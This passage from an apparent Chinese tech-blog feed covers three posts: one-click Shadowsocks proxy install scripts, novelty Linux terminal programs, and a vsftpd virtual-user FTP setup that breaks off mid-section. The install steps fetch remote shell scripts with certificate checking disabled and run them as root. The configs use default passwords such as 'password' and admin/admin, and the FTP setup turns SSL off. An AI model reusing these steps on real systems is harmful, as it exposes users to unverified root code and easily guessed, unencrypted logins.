        <content type="html"><![CDATA[<h2 id="一、Shadowsocks介绍"><a href="#一、Shadowsocks介绍" class="headerlink" title="一、Shadowsocks介绍"></a>一、Shadowsocks介绍</h2><p>Shadowsocks（中文名称：影梭）是使用Python等语言开发的、基于Apache许可证开源的代理软件。Shadowsocks使用socks5代理，用于保护网络流量。Shadowsocks分为服务器端和客户端。在使用之前，需要先将服务器端部署在支持Python等的服务器上面，然后通过客户端连接并创建本地代理。此外用户也可以选择购买基于Shadowsocks的商业服务，以获得更加稳定可靠的服务，或者免去自行部署的麻烦。目前开发者Clowwindy由于一些原因已宣布停止维护，shadowsocksR 的作者已表示会继续开发新版本。</p><p>对于想要使用SS的用户来说，相比在网路上买一些月供几十的SS服务商的出售的SS账户，自己倒不如买个便宜点的VPS自己构建一个SS服务器，为防止VPS资源过剩，自己也可以干点别的事情，这里给出了使用三种语言搭建SS服务器的一键安装脚本，供大家使用。</p><h2 id="二、Python一键脚本"><a href="#二、Python一键脚本" class="headerlink" title="二、Python一键脚本"></a>二、Python一键脚本</h2><ol><li><p>适用条件：系统为CentOS 6，7，Debian，Ubuntu 、内存≥128M</p></li><li><p>配置：服务器端口默认为8585 ，客户端端口为1080 ，密码默认为password</p></li><li><p>一键脚本（使用root用户）：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">wget --no-check-certificate https://raw.githubusercontent.com/CUBEGWZ/Shadowsocks/master/Python/shadowsocks.sh<br><span class="hljs-built_in">chmod</span> +x shadowsocks.sh<br>./shadowsocks.sh 2&gt;&amp;1 | <span class="hljs-built_in">tee</span> shadowsocks.log<br></code></pre></td></tr></table></figure></li><li><p>卸载与其他配置：<br>  卸载方式： <code>./shadowsocks.sh uninstall</code></p></li></ol><ul><li>单用户配置文件 Sample：<br> 配置文件路径：<code>/etc/shadowsocks.json</code></li></ul>  <figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">&#123;<br>    <span class="hljs-string">&quot;server&quot;</span>:<span class="hljs-string">&quot;0.0.0.0&quot;</span>,<br>    <span class="hljs-string">&quot;server_port&quot;</span>:8585,<br>    <span class="hljs-string">&quot;local_address&quot;</span>:<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<br>    <span class="hljs-string">&quot;local_port&quot;</span>:1080,<br>    <span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;password&quot;</span>,<br>    <span class="hljs-string">&quot;timeout&quot;</span>:300,<br>    <span class="hljs-string">&quot;method&quot;</span>:<span class="hljs-string">&quot;aes-256-cfb&quot;</span>,<br>    <span class="hljs-string">&quot;fast_open&quot;</span>: <span class="hljs-literal">false</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li>多用户多端口配置文件 Sample：<br> 配置文件路径：<code>/etc/shadowsocks.json</code></li></ul>  <figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">&#123;<br>    <span class="hljs-string">&quot;server&quot;</span>:<span class="hljs-string">&quot;0.0.0.0&quot;</span>,<br>    <span class="hljs-string">&quot;local_address&quot;</span>:<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<br>    <span class="hljs-string">&quot;local_port&quot;</span>:1080,<br>    <span class="hljs-string">&quot;port_password&quot;</span>:&#123;<br>    <span class="hljs-string">&quot;8585&quot;</span>:<span class="hljs-string">&quot;password0&quot;</span>,<br>    <span class="hljs-string">&quot;9001&quot;</span>:<span class="hljs-string">&quot;password1&quot;</span>,<br>    <span class="hljs-string">&quot;9002&quot;</span>:<span class="hljs-string">&quot;password2&quot;</span>,<br>    <span class="hljs-string">&quot;9003&quot;</span>:<span class="hljs-string">&quot;password3&quot;</span>,<br>    <span class="hljs-string">&quot;9004&quot;</span>:<span class="hljs-string">&quot;password4&quot;</span><br>    &#125;,<br>    <span class="hljs-string">&quot;timeout&quot;</span>:300,<br>    <span class="hljs-string">&quot;method&quot;</span>:<span class="hljs-string">&quot;aes-256-cfb&quot;</span>,<br>    <span class="hljs-string">&quot;fast_open&quot;</span>: <span class="hljs-literal">false</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="三、GO一键脚本"><a href="#三、GO一键脚本" class="headerlink" title="三、GO一键脚本"></a>三、GO一键脚本</h2><ol><li><p>适用条件：系统为CentOS，Debian，Ubuntu 、内存≥128M</p></li><li><p>配置：服务器端口默认为8585 ，客户端端口为1080 ，密码默认为password</p></li><li><p>一键脚本（使用root用户）：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">wget --no-check-certificate https://raw.githubusercontent.com/CUBEGWZ/Shadowsocks/master/Go/shadowsocks-go.sh<br><span class="hljs-built_in">chmod</span> +x shadowsocks-go.sh<br>./shadowsocks-go.sh 2&gt;&amp;1 | <span class="hljs-built_in">tee</span> shadowsocks-go.log<br></code></pre></td></tr></table></figure></li><li><p>卸载与其他配置：<br>  卸载方式： <code>./shadowsocks-go.sh uninstall</code></p></li></ol><ul><li>多用户多端口配置文件 Sample：<br> 配置文件路径：<code>/etc/shadowsocks.json</code></li></ul>  <figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">&#123;<br>    <span class="hljs-string">&quot;port_password&quot;</span>:&#123;<br>    <span class="hljs-string">&quot;8585&quot;</span>:<span class="hljs-string">&quot;password0&quot;</span>,<br>    <span class="hljs-string">&quot;9001&quot;</span>:<span class="hljs-string">&quot;password1&quot;</span>,<br>    <span class="hljs-string">&quot;9002&quot;</span>:<span class="hljs-string">&quot;password2&quot;</span>,<br>    <span class="hljs-string">&quot;9003&quot;</span>:<span class="hljs-string">&quot;password3&quot;</span>,<br>    <span class="hljs-string">&quot;9004&quot;</span>:<span class="hljs-string">&quot;password4&quot;</span><br>    &#125;,<br>    <span class="hljs-string">&quot;method&quot;</span>:<span class="hljs-string">&quot;aes-256-cfb&quot;</span>,<br>    <span class="hljs-string">&quot;timeout&quot;</span>:600<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="四、Libev一键脚本"><a href="#四、Libev一键脚本" class="headerlink" title="四、Libev一键脚本"></a>四、Libev一键脚本</h2><ol><li><p>适用条件：系统为CentOS 32或64位、内存≥128M</p></li><li><p>配置：服务器端口默认为8585 ，客户端端口为1080 ，密码默认为password</p></li><li><p>一键脚本（使用root用户）：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">wget --no-check-certificate https://raw.githubusercontent.com/CUBEGWZ/Shadowsocks/master/Libev/shadowsocks-libev.sh<br><span class="hljs-built_in">chmod</span> +x shadowsocks-libev.sh<br></code></pre></td></tr></table></figure></li><li><p>卸载与其他配置：<br>  卸载方式： <code>./shadowsocks-libev.sh uninstall</code></p></li></ol><ul><li><p>修改配置文件 <code>/etc/shadowsocks-libev/config.json</code>,同时启用 IPv4 与 IPv6 支持：</p>   <figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">&#123;<br>    <span class="hljs-string">&quot;server&quot;</span>:[<span class="hljs-string">&quot;[::0]&quot;</span>,<span class="hljs-string">&quot;0.0.0.0&quot;</span>],<br>    <span class="hljs-string">&quot;server_port&quot;</span>:your_server_port,<br>    <span class="hljs-string">&quot;local_address&quot;</span>:<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<br>    <span class="hljs-string">&quot;local_port&quot;</span>:1080,<br>    <span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;password&quot;</span>,<br>    <span class="hljs-string">&quot;timeout&quot;</span>:600,<br>    <span class="hljs-string">&quot;method&quot;</span>:<span class="hljs-string">&quot;aes-256-cfb&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h2 id="五、Shadowsocks操作命令"><a href="#五、Shadowsocks操作命令" class="headerlink" title="五、Shadowsocks操作命令"></a>五、Shadowsocks操作命令</h2><ul><li>启动：<code>/etc/init.d/shadowsocks start</code></li><li>停止：<code>/etc/init.d/shadowsocks stop</code></li><li>重启：<code>/etc/init.d/shadowsocks restart</code></li><li>状态：<code>/etc/init.d/shadowsocks status</code></li></ul><hr>]]></content>
      
      
      
        <tags>
            
            <tag> Shadowsocks </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux下有趣的东西</title>
      <link href="/2016/01/22/linux-interesting/"/>
      <url>/2016/01/22/linux-interesting/</url>
      
        <content type="html"><![CDATA[<p>如果你习惯使用Linux的Shell方式，而不是经常用Linux的界面形式，那你一定会学到更多东西，更能体会在门外汉看起来的高大上，但是，不要以为命令行的形式有多么枯燥，命令行中也有很多有意思的东西哦，例如可爱的小火车（sl），程序猿的愤怒（yes），会说话的ASCII动物（cowsay&#x2F;cowthink），随机输出一句话（fortune），让字符变为彩色的（lolcat），用符号拼凑字母（banner 和 figlet），终端上网（w3m），屏幕录制（script 和 scriptreplay），显示logo的（linuxlogo），分解因数（factor），屏保（cmatrix），屏幕燃烧（aafire），输出艺术字（toilet），不一样的音乐播放器（bb），观看星球大战（telnet）等。</p><h2 id="一、命令介绍"><a href="#一、命令介绍" class="headerlink" title="一、命令介绍"></a>一、命令介绍</h2><h3 id="1-1、可爱的小火车sl"><a href="#1-1、可爱的小火车sl" class="headerlink" title="1.1、可爱的小火车sl"></a>1.1、可爱的小火车<code>sl</code></h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt-get install sl<br></code></pre></td></tr></table></figure><p>当输入<code>sl</code>时就会有小火车路过哦!输入<code>sl -l</code>会出现加长版的小火车，输入<code>sl -F</code>就会出现晃动的小火车<br>再来个晃动的小火车：<br>其实，这个也可以用来恶搞别人，如果你输入：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">alias</span> <span class="hljs-built_in">ls</span>=sl<br></code></pre></td></tr></table></figure><p>因为<code>ls</code>是<code>Linux命令</code>中比较频繁的使用命令之一，当别人是输入<code>ls</code>的时候，小火车就出现了。。。</p><h3 id="1-2、程序猿的愤怒yes"><a href="#1-2、程序猿的愤怒yes" class="headerlink" title="1.2、程序猿的愤怒yes"></a>1.2、程序猿的愤怒<code>yes</code></h3><p>这个不需要安装什么东西，直接输入<code>yes</code>，然后回车，系统上面就会不断出现y，想停止的话，按<kbd>ctrl+z</kbd>。</p><h3 id="1-3、会说话的ASCII动物cowsay-cowthink"><a href="#1-3、会说话的ASCII动物cowsay-cowthink" class="headerlink" title="1.3、会说话的ASCII动物cowsay/cowthink"></a>1.3、会说话的ASCII动物<code>cowsay/cowthink</code></h3><p>首先需要安装<code>cowsay</code>,输入下面命令进行安装：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt-get install cowsay<br></code></pre></td></tr></table></figure><p>安装后，当我们输入：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">cowsay hello everyone！<br></code></pre></td></tr></table></figure><p>就出现了，一头会说话的奶牛（它说的话就是我们指定的内容）;也可以用下面的命令输出：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">cowthink hello everyone!<br></code></pre></td></tr></table></figure><p>其实不光可以用<code>cow</code>(奶牛)，也可以用其他的动物，你可以使用下面命令，查看可以使用的动物,下图有实例：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">cowsay -l<br></code></pre></td></tr></table></figure><p>使用的话，代码如下(<code>name</code>为动物名称；<code>words</code>为动物要说的内容)：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">cowsay -f name words<br></code></pre></td></tr></table></figure><p>还可以使用这段代码，这样每次说话的动物都不同（下图有实例）：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">cowsay -f <span class="hljs-string">&quot;<span class="hljs-subst">$(ls /usr/share/cowsay/cows | sort -R | head -1)</span>&quot;</span> hello everyone!<br></code></pre></td></tr></table></figure><h3 id="1-4、随机输出一句话fortune"><a href="#1-4、随机输出一句话fortune" class="headerlink" title="1.4、随机输出一句话fortune"></a>1.4、随机输出一句话<code>fortune</code></h3><p>如果仅安装上<code>fortune</code>就可以输出一句英文名言，或者英文的一句话，如果再安装上<code>fortune-zh</code>就可以使用fortune输出英文的和中文的，输出中文的是古诗词。</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt-get install fortune<br><span class="hljs-built_in">sudo</span> apt-get install fortune-zh<br></code></pre></td></tr></table></figure><p>如果想输出一句话，直接使用<code>fortune</code>输出即可。<br>另一个有意思的方法是和<code>cowsay</code>结合起来的话，代码为:</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">fortune | cowsay<br></code></pre></td></tr></table></figure><p>也可以使用随机动物输出一句话，代码为：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">cowsay -f <span class="hljs-string">&quot;<span class="hljs-subst">$(ls /usr/share/cowsay/cows | sort -R | head -1)</span>&quot;</span> <span class="hljs-string">&quot;<span class="hljs-subst">$(fortune -s)</span>&quot;</span><br></code></pre></td></tr></table></figure><h3 id="1-5、让字符变为彩色的lolcat"><a href="#1-5、让字符变为彩色的lolcat" class="headerlink" title="1.5、让字符变为彩色的lolcat"></a>1.5、让字符变为彩色的<code>lolcat</code></h3><p>我们需要安装名为<code>lolcat</code>的软件，代码如下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt-get install lolcat<br></code></pre></td></tr></table></figure><p>安装完成之后，可以与前面讲的<code>fortune</code>结合使用，代码如下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">fortune | lolcat<br></code></pre></td></tr></table></figure><p>这两个小软件还可以与<code>cowsay</code>结合使用，代码如下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">cowsay -f <span class="hljs-string">&quot;<span class="hljs-subst">$(ls /usr/share/cowsay/cows | sort -R | head -1)</span>&quot;</span> <span class="hljs-string">&quot;<span class="hljs-subst">$(fortune -s)</span>&quot;</span> | lolcat<br></code></pre></td></tr></table></figure><h3 id="1-6、用符号拼凑字母banner和figlet"><a href="#1-6、用符号拼凑字母banner和figlet" class="headerlink" title="1.6、用符号拼凑字母banner和figlet"></a>1.6、用符号拼凑字母<code>banner</code>和<code>figlet</code></h3><p>首先我们安装<code>bnner</code>：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt-get install sysvbanner<br></code></pre></td></tr></table></figure><p>然后我们可以直接输入<code>banner</code>进行使用。<br>然后我们来安装<code>figlet</code>，代码如下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt-get install figlet<br></code></pre></td></tr></table></figure><p>然后我们可以直接输入<code>figlet</code>进行使用。<br>可以看出，这两个拼的样式不同的哈~个人比较喜欢后面的~~~~~</p><h3 id="1-7、终端上网w3m"><a href="#1-7、终端上网w3m" class="headerlink" title="1.7、终端上网w3m"></a>1.7、终端上网<code>w3m</code></h3><p>因为我用的是服务器环境，虽然说我都是SSH它，浏览信息都在我本地电脑上，可是真有个终端上网的工具，相信用处还是挺大的。安装代码如下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt-get install w3m w3m-img<br></code></pre></td></tr></table></figure><p>如果只是用来上个网，直接使用下面的代码，下面有实例（浏览时图片显示不出来，因为我用的server版本），如果想看别的<code>options</code>，直接<code>help</code>查看一下（想要退出的话，按<kbd>ctrl+z</kbd>）；</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">w3m cn.bing.com<br></code></pre></td></tr></table></figure><h3 id="1-8、屏幕录制script-scriptreplay"><a href="#1-8、屏幕录制script-scriptreplay" class="headerlink" title="1.8、屏幕录制script&amp;scriptreplay"></a>1.8、屏幕录制<code>script</code>&amp;<code>scriptreplay</code></h3><p>使用<code>script</code>命令可是将你在屏幕上的操作录制下来（结束录制的话，输入<code>exit</code>并<kbd>回车</kbd>）。使用<code>scriptreplay</code>可以查看你的录制。<br>使用下面的代码开始录制（实例如下）：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">script -t 2&gt;example.time -a example.txt<br></code></pre></td></tr></table></figure><p>注解上面的代码：</p><ol><li><code>-t</code> 是把时间数据输出到标准错误<code>(standard error)</code>，所以这里使用<code>2&gt;example.time</code>把数据转向到<code>example.txt</code>这个文件当中。</li><li><code>-a</code>选项是指定输出录制的文件</li></ol><p>输入<code>exit</code>并按<kbd>回车</kbd>来结束录制。<br>查看录制的代码的代码为：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">scriptreplay example.time example.txt<br></code></pre></td></tr></table></figure><h3 id="1-9、显示logo的linuxlogo"><a href="#1-9、显示logo的linuxlogo" class="headerlink" title="1.9、显示logo的linuxlogo"></a>1.9、显示logo的<code>linuxlogo</code></h3><p><code>linuxlogo</code>(或<code>linux_logo</code>)是一款在<code>Linux</code>命令行下用彩色 ANSI 代码生成附带有系统信息的发行版徽标的工具。</p><p>首先安装这个小工具：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt-get install linuxlogo<br></code></pre></td></tr></table></figure><p>安装完成后，我们可以使用<code>linuxlogo</code>命令查看你当前使用的发行版的默认徽标,我们可以查看它的<code>help</code>，里面有很多<code>options</code>，这里只介绍一些：<br>输入下面的代码表示仅输出徽标而不包含系统信息：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">linuxlogo -l<br></code></pre></td></tr></table></figure><p>输入下面的代码表示输出灰色的信息：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">linuxlogo -a<br></code></pre></td></tr></table></figure><p>其实这个工具内部还有很多徽标，你可以使用 <code>[-L list]</code> 选项查看在这些徽标的列表，代码及实例如下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">linuxlogo -L list<br></code></pre></td></tr></table></figure><p>关于这个小工具更详细的介绍，大家可以去 <a href="https://linux.cn/article-5838-1.html">这里</a></p><h3 id="1-10、分解因数factor"><a href="#1-10、分解因数factor" class="headerlink" title="1.10、分解因数factor"></a>1.10、分解因数<code>factor</code></h3><p><code>factor</code>不需要安装，可以直接使用，代码格式如下(number可以为任意整数):</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">factor</span> number<br></code></pre></td></tr></table></figure><h3 id="1-11、屏保cmatrix"><a href="#1-11、屏保cmatrix" class="headerlink" title="1.11、屏保cmatrix"></a>1.11、屏保<code>cmatrix</code></h3><p>从上往下不断的输出字符串，和很多黑客电影中的场景差不多，估计那些电影也是用的这个吧.安装代码如下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt-get install cmatrix<br></code></pre></td></tr></table></figure><p>启动代码为<code>cmatrix</code>,退出的话直接<kbd>ctrl+z</kbd>即可。</p><h3 id="1-12、屏幕燃烧aafire"><a href="#1-12、屏幕燃烧aafire" class="headerlink" title="1.12、屏幕燃烧aafire"></a>1.12、屏幕燃烧<code>aafire</code></h3><p>该命令会输出由<code>ASCII</code>组成的字符，创造仿佛屏幕燃烧的效果。下面是安装，启动代码及实例：<br>安装代码：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt-get install libaa-bin<br></code></pre></td></tr></table></figure><p>启动代码：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">aafire<br></code></pre></td></tr></table></figure><h3 id="1-13、输出艺术字toilet"><a href="#1-13、输出艺术字toilet" class="headerlink" title="1.13、输出艺术字toilet"></a>1.13、输出艺术字<code>toilet</code></h3><p>还是由ASCII组成的艺术字。安装代码如下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt-get install toilet<br></code></pre></td></tr></table></figure><h3 id="1-14、不一样的音乐播放器bb"><a href="#1-14、不一样的音乐播放器bb" class="headerlink" title="1.14、不一样的音乐播放器bb"></a>1.14、不一样的音乐播放器<code>bb</code></h3><p>安装代码如下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt-get install bb<br></code></pre></td></tr></table></figure><p>启动代码(这款软件是有声音的哦!)：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">bb<br></code></pre></td></tr></table></figure><h3 id="1-15、观看星球大战telnet"><a href="#1-15、观看星球大战telnet" class="headerlink" title="1.15、观看星球大战telnet"></a>1.15、观看星球大战<code>telnet</code></h3><p>telnet是基于Telnet协议的远程登陆客户端程序，经常用来远程登录服务器，但是现在，我们却用它来看星球大阵，哈哈哈~</p><p>观看命令：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">telnet towel.blinkenlights.nl<br></code></pre></td></tr></table></figure><p>这个有点长，并且，我好像不知道怎么退出去了。。。</p><hr>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vsftpd搭建FTP服务器</title>
      <link href="/2016/01/22/vsftpd-ftp/"/>
      <url>/2016/01/22/vsftpd-ftp/</url>
      
        <content type="html"><![CDATA[<h2 id="一、要求"><a href="#一、要求" class="headerlink" title="一、要求"></a>一、要求</h2><p>现在我们需要在<code>Ubuntu14.04</code>上利用<code>vsftpd</code>创建<code>ftp</code>服务器环境，然后在禁止匿名访问的前提下，创建以下四个虚拟用户并配权：</p><ol><li>一个用户为：<code>tea1</code>，密码为：<code>tea1pass</code>，进入<code>tea1</code>目录（对该目录及其子目录拥有所有权限，不可进入上级目录）。</li><li>一个用户为：<code>tea2</code>，密码为：<code>tea2pass</code>，进入<code>tea2</code>目录（对该目录及其子目录拥有所有权限，不可进入上级目录）。</li><li>一个用户为：<code>stu</code>，密码为：<code>stupass</code>，进入<code>ftp</code>总目录（只拥有上传文件权限，不可进入上级目录）。</li><li>一个用户名为：<code>admin</code>，密码为：<code>admin</code>，进入<code>ftp</code>总目录（拥有ftp的全部权限）。</li></ol><p>注：<code>ftp</code>的主目录为<code>/home/ftp/ftp</code>，如果需要创建其他用户，或者修改用户权限，使用SSH修改。</p><h2 id="二、vsftpd安装："><a href="#二、vsftpd安装：" class="headerlink" title="二、vsftpd安装："></a>二、vsftpd安装：</h2><p>在配置<code>vsftpd</code>之前，我们先安装<code>vsftpd</code>，<code>vsftpd</code>的安装比较简单。我们直接使用<code>apt-get</code>进行安装，如下：  </p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt-get -y install vsftpd<br></code></pre></td></tr></table></figure><p>安装步骤很简单，这一个命令就ok了，不过配置才是大头。你可以使用下面的命令尝试去看<code>vsftpd</code>安装的一些文件：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">dpkg -L vsftpd |<span class="hljs-built_in">tac</span><br></code></pre></td></tr></table></figure><p>（这里只说明<code>/etc/init/vsftpd.conf</code>是<code>vsftpd</code>的初始化文件，而<code>/etc/vsftpd.conf</code>是<code>vsftpd</code>的配置文件）</p><p>vsftpd的启动，停止，重启方式：</p><ol><li><p>在ubuntu下要启动、停止、重启vsftpd，我们必须使用以下命令：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> service vsftpd stop<br><span class="hljs-built_in">sudo</span> service vsftpd start<br><span class="hljs-built_in">sudo</span> service vsftpd restart<br></code></pre></td></tr></table></figure></li><li><p>在centos下，我们可以使用以下命令：  </p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">service vsftpd stop<br>/etc/init.d/vsftpd stop<br></code></pre></td></tr></table></figure></li></ol><h2 id="三、配置"><a href="#三、配置" class="headerlink" title="三、配置"></a>三、配置</h2><p>由于我们已经安装完了，所以，接下来我们就要进行一些配置，其实在我们安装完vsftpd之后，这个程序就会自动创建一个账户为ftp的账户，大家可以用下面的命令查看创建好的ftp用户：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/passwd<br></code></pre></td></tr></table></figure><p>不过我不想使用它，我们就先把它删除了吧，反正以后也用不到，然后我们再创建一个用户ftp，代码如下：  </p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">userdel -r ftp <br><span class="hljs-built_in">sudo</span> useradd -m -s /bin/bash ftp<br></code></pre></td></tr></table></figure><p>创建后，可以查看一下刚创建的用户（注意：这个用户是无法登录系统的，只是用来作后面虚拟用户的载体）：  </p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/passwd |grep ftp<br></code></pre></td></tr></table></figure><p>创建完成新用户后，我们来创建该用户的对应的目录并修改用户之前的对应目录：  </p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">chown</span> -R ftp:ftp /home/ftp/<br></code></pre></td></tr></table></figure><p>由于我们需要使用虚拟用户登录系统，所以我们接下来设置虚拟用户的账户名和密码的文件<code>login.txt</code>，如下代码所示：  </p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">mkdir</span> /etc/vsftpd/<br><span class="hljs-built_in">sudo</span> vim /etc/vsftpd/login.txt<br></code></pre></td></tr></table></figure><p>然后在文件中，输入我们想要创建的四个用户的用户名及其密码并保存,需要注意的是一个账户一行，一个密码一行，一共四个用户和密码，也就是需要占用八行。<br>之后，我们需要用到<code>db_load</code>进行加密处理，所以我们还需要下载并安装<code>db-util</code>，代码如下：  </p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt-get -y install db-util<br></code></pre></td></tr></table></figure><p>安装成功后，使用<code>db_load</code>对<code>loginx.txt</code>进行加密处理：  </p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> db_load -T -t <span class="hljs-built_in">hash</span> -f /etc/vsftpd/login.txt /etc/vsftpd/login.db<br></code></pre></td></tr></table></figure><p>将<code>loginx.txt</code>加密处理后，我们接下来配置<code>vsftpd</code>的PAM验证。<br>创建验证文件，代码如下：  </p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> vim /etc/pam.d/vsftpd.virtual<br></code></pre></td></tr></table></figure><p>在打开的文件中输入下面的代码（注意：下面代码中的<code>pam_userdb.so</code>的路径根据具体的路径进行填写，如果不知道，请find一下。下面的<code>/etc/vsftpd/login</code>等同于<code>/etc/vsftpd/login.db</code>文件，后面不需要写后缀。）： </p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">auth required /lib/x86_64-linux-gnu/security/pam_userdb.so db=/etc/vsftpd/login<br>account required /lib/x86_64-linux-gnu/security/pam_userdb.so db=/etc/vsftpd/login<br></code></pre></td></tr></table></figure><p>接下来我们开始进行用户权限的分配！使用下面代码打开配置文件：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> vim /etc/vsftpd.conf<br></code></pre></td></tr></table></figure><p>确保该文件中下面的代码正确并且已经启用（如果没有请手动添加）：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">listen=YES<br>listen_ipv6=NO<br>anonymous_enable=NO<br>local_enable=YES<br>write_enable=YES<br>local_umask=022<br>dirmessage_enable=YES<br>use_localtime=YES<br>xferlog_enable=YES<br>connect_from_port_20=YES<br>xferlog_file=/var/log/vsftpd.log<br>xferlog_std_format=YES<br>chroot_local_user=YES<br>chroot_list_enable=NO<br>allow_writeable_chroot=YES<br>secure_chroot_dir=/var/run/vsftpd/empty<br>pam_service_name=vsftpd<br>rsa_cert_file=/etc/ssl/certs/ssl-cert-snakeoil.pem<br>rsa_private_key_file=/etc/ssl/private/ssl-cert-snakeoil.key<br>ssl_enable=NO<br>guest_enable=YES<br>pam_service_name=vsftpd.virtual<br>user_config_dir=/etc/vsftpd/vu<br>pasv_enable=YES<br>pasv_min_port=30000<br>pasv_max_port=31000<br></code></pre></td></tr></table></figure><p>上面这些代码的具体含义请自行查询，这里不做解释。<br>首先由于这些虚拟用户还没有对应的文件夹，所以我们需要在<code>/home/ftp/ftp</code>中创建对应的文件夹，并且将文件夹所有者设置为<code>ftp</code>，由于<code>stu</code>用户和<code>admin</code>用户都指向总目录，所以不需要额外创建目录，因此代码如下所示：  </p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">mkdir</span> /home/ftp/ftp<br><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">chown</span> -R ftp:ftp /home/ftp/ftp/<br><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">mkdir</span> /home/ftp/ftp/tea1<br><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">chown</span> -R ftp:ftp /home/ftp/ftp/tea1/<br><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">mkdir</span> /home/ftp/ftp/tea2<br><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">chown</span> -R ftp:ftp /home/ftp/ftp/tea2/<br></code></pre></td></tr></table></figure><h2 id="四、虚拟用户的权限的配置"><a href="#四、虚拟用户的权限的配置" class="headerlink" title="四、虚拟用户的权限的配置"></a>四、虚拟用户的权限的配置</h2><p>创建完虚拟用户对应的目录后，我们需要建立虚拟用户对应的配置文件，对虚拟用户的权限进行配置，代码如下：</p><figure class="highlight 